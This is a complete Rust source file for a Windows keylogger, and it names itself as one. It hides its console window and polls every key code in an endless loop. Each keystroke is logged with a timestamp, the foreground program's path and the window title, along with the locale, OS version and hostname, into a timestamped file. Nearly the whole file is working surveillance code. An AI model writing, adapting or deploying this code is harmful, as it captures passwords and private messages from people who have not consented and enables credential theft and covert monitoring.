#![windows_subsystem = "windows"]

#[cfg(windows)]
extern crate winapi;

extern crate chrono;
extern crate os_info;
extern crate hostname;

use std::fs::*;
use std::io::*;
use chrono::{DateTime, Utc, Timelike};

mod keys;

use crate::keys::{ Key, Position };

#[cfg(windows)]
fn run(file: &mut File) {
    use winapi::um::winuser::*;
    use winapi::ctypes::c_int;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::um::winnls::GetUserDefaultLocaleName;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use std::{thread, time::Duration};

    log_header(file);

    let locale = unsafe {
        const LEN: i32 = 64;
        let mut buf = vec![0 as u16; LEN as usize];
        GetUserDefaultLocaleName(buf.as_mut_ptr(), LEN);

        //find the null terminator
        let mut len = 0;
        buf.iter().enumerate().for_each(|(i, c)| {
            if *c == 0 && len == 0 {
                len = i;
            }
        });

        String::from_utf16_lossy(buf[0..len].as_mut())
    };

    log(file, format!("Locale: {}\n", locale));
    log(file, "\nKeylogs:\n".to_string());

    //logging
    loop {
        thread::sleep(Duration::from_millis(10));

        let hwnd = unsafe { GetForegroundWindow() };

        let pid = unsafe {
            let mut p = 0 as DWORD;
            GetWindowThreadProcessId(hwnd, &mut p);
            p
        };

        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };

        let filename = unsafe {
            const LEN: u32 = 255;
            let mut buf = vec![0 as u16; LEN as usize];
            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);

            //find the null terminator
            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
                }
            });

            String::from_utf16_lossy(buf[0..len].as_mut())
        };

        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut t = String::from("__NO_TITLE__");

            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                t = String::from_utf16_lossy(buf.as_mut());
            }

            t
        };

        let now: DateTime<Utc> = Utc::now();

        for i in 0 as c_int..255 as c_int {
            let key = unsafe { GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                                now.hour(), now.minute(), now.second(),
                                filename.trim(), title.trim(), keycode_to_string(i as u8));

                log(file, s);
            }
        }
    }
}

fn log_header(file: &mut File) {
    log(file, "~~~~~Logheader~~~~~\n".to_string());

    let os_info = {
        let info = os_info::get();
        format!("OS: type: {}, version: {}\n", info.os_type(), info.version())
    };
    log(file, os_info);

    let hostname = format!("Hostname: {}\n", hostname::get_hostname().unwrap_or("_NO_HOSTNAME_".to_string()));
    log(file, hostname);
}

fn log(file: &mut File, s: String) {
    #[cfg(debug_assertions)] {
        print!("{}", s);
    }

    match file.write(s.as_bytes()) {
        Err(e) => { println!("Couldn't write to log file: {}", e) }
        _ => {}
    }
}

fn keycode_to_string(k: u8) -> String {
    format!("{:?}", Key::from_u8(k))
}

fn get_mouse_pos() -> Position {
    use winapi::um::winuser::*;
    use winapi::shared::windef::POINT;

    let pos = unsafe {
        let mut p = POINT { x: -1, y: -1 };
        GetCursorPos(&mut p);
        p
    };
    (pos.x, pos.y)
}

#[cfg(not(windows))]
fn run(file: &mut File) {
    log_header(file);
    log(file, "This keylogger only works on windows".to_string());
}

fn main() {
    let now: DateTime<Utc> = Utc::now();
    let filename = format!("log-{}-{:02}+{:02}+{:02}.log", now.date(), now.hour(), now.minute(), now.second());

    let mut output = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => { f }

            Err(e) => {
                panic!("Couldn't create Output file: {}", e);
            }
        }
    };

    run(&mut output);
}

